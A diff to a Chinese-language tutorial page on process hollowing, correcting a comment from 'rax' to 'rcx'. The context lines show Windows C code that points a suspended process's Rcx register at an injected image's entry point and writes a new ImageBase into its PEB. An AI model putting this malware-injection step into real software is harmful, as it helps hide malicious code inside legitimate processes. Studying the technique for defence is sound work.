@@ -104,7 +104,7 @@ description: 进程镂空
 挂起创建的进程rcx&eax内存储着软件的入口点,需要将PEB内的实际加载地址修改为恶意软件预期的加载地址。
 
 ```text
-//将rax寄存器设置为注入软件的入口点,并将预期加载地址修改为实际加载地址
+//将rcx寄存器设置为注入软件的入口点,并将预期加载地址修改为实际加载地址
 #ifdef _WIN64
 	ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint); 
 	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL); 
